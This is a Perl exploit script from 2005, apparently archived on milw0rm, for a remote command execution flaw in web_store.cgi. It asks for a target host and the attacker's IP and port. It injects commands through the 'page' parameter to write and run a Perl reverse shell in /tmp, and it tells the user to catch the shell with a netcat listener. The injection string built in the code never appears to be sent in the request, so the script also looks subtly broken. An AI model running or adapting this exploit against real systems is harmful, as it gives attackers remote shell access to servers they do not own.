#!/usr/bin/perl -w
#
#********************************************************************************************
#               Remote Command Execution Vulnerability In Web_store.cgi                     *
#                                                                                           *
#                              [SegmentationFault Group]                                    *
#                                                                                           *
#                                                                                           *
#             Greetz to  :  Xsupr3mo -  failed   - Status-x -  Stealh - P3S4D3L0            *
#             Greetz to  :  berhooz  -   nima  - ehsan   - Unknown  OutLaw  eutanasia       *
#                                      www.ashiyane.com                                     *
#                                                                                           *
#********************************************************************************************
#ok setp by setp to work :                      *                                           *
#[*] start exploit                              *   If connect back shell not found: maybe :*
#[*] run in your system: nc -l -vv -p 2975      *   you do not have perm to write in /tmp   *
#[*] starting connect back on 127.0.0.1 :2975   *            Shell not vulnerable           *
#[*] DONE!                                      *   test and put in /$path/hints.pl?|cd /tmp*
#[*] Look netcat windows                        *     other path that u know dont have perm *
#                                               *                                           *
#********************************************************************************************
#############################################################################################
use IO::Socket;

print "*****************************************************************\n";
print "\tRemote Command Execution Vulnerability in web_store.cgi\n  ";
print "\t\t-=[  SegmentationFault Group  ]=-\n";      
print "\t\tcode writen    by sun-os [ActionSpider]\n\n";  
print "\tGerttz to : Xsupr3mo -  failed   - Status-x -  Stealh";
print "\n\tand : Behrooz - nima - ehsan www.ashiyane.com\n";
print "*****************************************************************\n\n";


print "enter hostname or ip : \n";
chomp($server=<STDIN>);

print "port: (default: 80)\n";
chomp($port=<STDIN>);
$port=80 if ($port =~/\D/ );
$port=80 if ($port eq "" );

print "path: (???/web_store.cgi?)\n";
chomp($path=<STDIN>);

print "your ip (for reverse connect): \n";
chomp($ip=<STDIN>);

print "your port (for reverse connect): \n";
chomp($reverse=<STDIN>);

print "ok Remote Command Execution now Start";
print "|+| try to exploiting...\n";

$string="/$path/web_store.cgi?page=.html|cd /tmp;echo ".q{use Socket;$execute= 'echo "`uname -a`";echo "`id`";/bin/sh';$target=$ARGV[0];$port=$ARGV[1];$iaddr=inet_aton($target) || die("Error: $!\n");$paddr=sockaddr_in($port, $iaddr) || die("Error: $!\n");$proto=getprotobyname('tcp');socket(SOCKET, PF_INET, SOCK_STREAM, $proto) || die("Error: $!\n");connect(SOCKET, $paddr) || die("Error: $!\n");open(STDIN, ">&SOCKET");open(STDOUT, ">&SOCKET");open(STDERR, ">&SOCKET");system($execute);close(STDIN)}." >>dc.pl;perl dc.pl $ip $reverse|";

print "|+| OK! \n";
print "|+| NOW, run in your system: nc -l -vv -p $reverse\n";
print "|+| starting connect back on $ip :$reverse\n";
print "|+| DONE!\n";
print "|+| Look netcat windows\n\n";
$socket=IO::Socket::INET->new( PeerAddr => $server, PeerPort => $port, Proto => tcp)
or die;

print $socket "POST $path HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "User-Agent: blackbox\n";
print $socket "Pragma: no-cache\n";
print $socket "Cache-Control: no-cache\n";
print $socket "Connection: close\n\n";

print "have nice shell...";

# milw0rm.com [2005-06-15]
